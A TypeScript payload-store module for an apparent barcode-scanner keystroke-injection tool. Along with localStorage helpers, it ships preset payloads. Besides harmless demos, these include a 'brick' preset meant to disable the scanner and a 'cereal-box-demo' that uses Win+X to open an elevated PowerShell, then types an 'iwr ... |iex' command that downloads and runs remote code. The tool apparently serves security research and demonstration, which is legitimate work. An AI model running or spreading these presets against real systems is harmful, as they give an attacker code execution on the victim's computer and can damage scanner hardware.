/**
 * Payload Store
 * 
 * Manages payload storage using localStorage with built-in presets.
 * Payloads are stored as JSON and can be imported/exported.
 */

import type { Payload } from '../core/types';

const STORAGE_KEY = 'barcowned_payloads';
const SETTINGS_KEY = 'barcowned_settings';
const DRAFTS_KEY = 'barcowned_drafts';

/**
 * Built-in preset payloads.
 * These are read-only examples that users can fork into their own.
 */
export const presets: Record<string, Payload> = {
  'hello-world': {
    name: 'Hello World',
    description: 'Scan hello, get a bonus world! Friendly!',
    setup: {
      options: [],
      rules: [
        {
          criteria: [['stringatstart', 'hello']],
          actions: [['sendremaining'], ['sendtext', 'world']],
        },
      ],
    },
    payload: ['hello'],
  },
  
  'run-calc': {
    name: 'Run calc.exe',
    description: 'Open the Windows Run dialog and open Calculator',
    setup: {
      options: [],
      rules: [
        {
          criteria: [['stringatstart', '!']],
          actions: [
            ['sendgui', 'R'],
            ['sendpausealt', '20'],
            ['skipcharacters', '1'],
            ['sendremaining'],
            ['sendenter'],
          ],
        },
      ],
    },
    payload: ['!calc.exe'],
  },

  'run-cmd': {
    name: 'Run cmd.exe',
    description: 'Open a command prompt via Windows Run dialog',
    setup: {
      options: [],
      rules: [
        {
          criteria: [['stringatstart', '~']],
          actions: [
            ['sendgui', 'R'],
            ['sendpausealt', '20'],
            ['skipcharacters', '1'],
            ['sendremaining'],
            ['sendenter'],
          ],
        },
      ],
    },
    payload: ['~cmd.exe'],
  },

  tetris: {
    name: 'Tetris',
    description: 'Play Tetris slowly and awkwardly! Works for https://tetris.com/play-tetris',
    setup: {
      options: [],
      rules: [
        {
          criteria: [['stringatstart', 'down']],
          actions: [['sendarrowkey', 'down']],
        },
        {
          criteria: [['stringatstart', 'left']],
          actions: [['sendarrowkey', 'left']],
        },
        {
          criteria: [['stringatstart', 'right']],
          actions: [['sendarrowkey', 'right']],
        },
        {
          criteria: [['stringatstart', 'rotateleft']],
          actions: [['sendtext', 'z']],
        },
        {
          criteria: [['stringatstart', 'rotateright']],
          actions: [['sendarrowkey', 'up']],
        },
        {
          criteria: [['stringatstart', 'harddrop']],
          actions: [['sendtext', ' ']],
        },
      ],
    },
    payload: ['down', 'left', 'right', 'rotateleft', 'rotateright', 'harddrop'],
  },

  brick: {
    name: 'Brick',
    description: 'Soft brick your barcode scanner!',
    setup: {
      options: [],
      rules: [
        {
          criteria: [],
          actions: [['sendpausealt', '99'], ['sendpausealt', '99']],
        },
      ],
    },
    payload: ['038000144158', 'please help', 'im trapped in a barcodefactory'],
  },

  'cereal-box-demo': {
    name: 'Cereal Box Demo',
    description: 'Scan a box of Smorz and watch the shells drop',
    setup: {
      options: [],
      rules: [
        {
          criteria: [['stringatstart', '0380']],
          actions: [
            ['sendgui', 'X'],
            ['sendpausealt', '20'],
            ['sendtext', 'A'],
            ['sendpausealt', '20'],
            ['sendalt', 'Y'],
            ['sendpausealt', '20'],
            ['sendtext', '.{iwr '],
            ['sendremaining'],
            ['sendtext', '.pw}|iex'],
            ['sendenter'],
          ],
        },
      ],
    },
    payload: ['038000144158'],
  },
};

/**
 * Stored payload with metadata.
 */
export interface StoredPayload {
  id: string;
  payload: Payload;
  createdAt: number;
  updatedAt: number;
}

/**
 * Load all user payloads from localStorage.
 */
export function loadPayloads(): StoredPayload[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch (e) {
    console.error('Failed to load payloads:', e);
    return [];
  }
}

/**
 * Save all user payloads to localStorage.
 */
export function savePayloads(payloads: StoredPayload[]): void {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(payloads));
}

/**
 * Get a payload by ID (checks user payloads first, then presets).
 */
export function getPayload(id: string): Payload | undefined {
  // Check user payloads
  const stored = loadPayloads().find((p) => p.id === id);
  if (stored) return stored.payload;
  
  // Check presets
  return presets[id];
}

/**
 * Create a new user payload.
 */
export function createPayload(payload: Payload): StoredPayload {
  const payloads = loadPayloads();
  const id = generateId();
  const now = Date.now();
  
  const stored: StoredPayload = {
    id,
    payload,
    createdAt: now,
    updatedAt: now,
  };
  
  payloads.push(stored);
  savePayloads(payloads);
  return stored;
}

/**
 * Update an existing user payload.
 */
export function updatePayload(id: string, payload: Payload): StoredPayload | undefined {
  const payloads = loadPayloads();
  const index = payloads.findIndex((p) => p.id === id);
  
  if (index === -1) return undefined;
  
  payloads[index] = {
    ...payloads[index],
    payload,
    updatedAt: Date.now(),
  };
  
  savePayloads(payloads);
  return payloads[index];
}

/**
 * Delete a user payload.
 */
export function deletePayload(id: string): boolean {
  const payloads = loadPayloads();
  const index = payloads.findIndex((p) => p.id === id);
  
  if (index === -1) return false;
  
  payloads.splice(index, 1);
  savePayloads(payloads);
  return true;
}

/**
 * Fork a preset into a new user payload.
 */
export function forkPreset(presetId: string, newName?: string): StoredPayload | undefined {
  const preset = presets[presetId];
  if (!preset) return undefined;
  
  return createPayload({
    ...preset,
    name: newName ?? `${preset.name} (copy)`,
  });
}

/**
 * Export payloads to JSON string.
 */
export function exportPayloads(ids?: string[]): string {
  const payloads = loadPayloads();
  const toExport = ids 
    ? payloads.filter((p) => ids.includes(p.id))
    : payloads;
  
  return JSON.stringify(toExport.map((p) => p.payload), null, 2);
}

/**
 * Import payloads from JSON string.
 */
export function importPayloads(json: string): StoredPayload[] {
  const parsed = JSON.parse(json);
  const payloads: Payload[] = Array.isArray(parsed) ? parsed : [parsed];
  
  return payloads.map((p) => createPayload(p));
}

/**
 * Generate a random ID.
 */
function generateId(): string {
  return Math.random().toString(36).substring(2, 10);
}

// ============================================
// Drafts (working copies)
// ============================================

export interface DraftPayload {
  /** Draft id (same as base id for saved/preset, or unique for new drafts) */
  id: string;
  /** Base id if this draft is for an existing payload/preset */
  baseId?: string;
  /** Base type */
  baseType: 'user' | 'preset' | 'new';
  /** Raw editor text (preserves invalid JSON) */
  text: string;
  /** Editor scroll position */
  scrollTop?: number;
  /** Last updated */
  updatedAt: number;
}

export function loadDrafts(): DraftPayload[] {
  try {
    const raw = localStorage.getItem(DRAFTS_KEY);
    if (!raw) return [];
    return JSON.parse(raw);
  } catch (e) {
    console.error('Failed to load drafts:', e);
    return [];
  }
}

export function saveDrafts(drafts: DraftPayload[]): void {
  localStorage.setItem(DRAFTS_KEY, JSON.stringify(drafts));
}

export function saveDraft(draft: DraftPayload): DraftPayload {
  const drafts = loadDrafts();
  const index = drafts.findIndex((d) => d.id === draft.id);
  if (index === -1) {
    drafts.push(draft);
  } else {
    drafts[index] = { ...drafts[index], ...draft };
  }
  saveDrafts(drafts);
  return draft;
}

export function deleteDraft(id: string): void {
  const drafts = loadDrafts();
  const index = drafts.findIndex((d) => d.id === id);
  if (index === -1) return;
  drafts.splice(index, 1);
  saveDrafts(drafts);
}

export function getDraft(id: string): DraftPayload | undefined {
  return loadDrafts().find((d) => d.id === id);
}

/**
 * Settings storage.
 */
export interface Settings {
  modelId: string;
  displayMode: 'auto' | 'list' | 'manual';
  barcodeType: '1d' | '2d';
  autoRate: number;
  startDelay: number;
  quietPeriod: number;
  darkMode: boolean;
  barcodeScale: number;
  shareQrScale: number;
}

export const defaultSettings: Settings = {
  modelId: 'symbol',
  displayMode: 'auto',
  barcodeType: '2d',
  autoRate: 0.4,
  startDelay: 3,
  quietPeriod: 0.5,
  darkMode: true,
  barcodeScale: 4,
  shareQrScale: 3,
};

export function loadSettings(): Settings {
  try {
    const raw = localStorage.getItem(SETTINGS_KEY);
    if (!raw) return defaultSettings;
    return { ...defaultSettings, ...JSON.parse(raw) };
  } catch (e) {
    return defaultSettings;
  }
}

export function saveSettings(settings: Partial<Settings>): Settings {
  const current = loadSettings();
  const updated = { ...current, ...settings };
  localStorage.setItem(SETTINGS_KEY, JSON.stringify(updated));
  return updated;
}
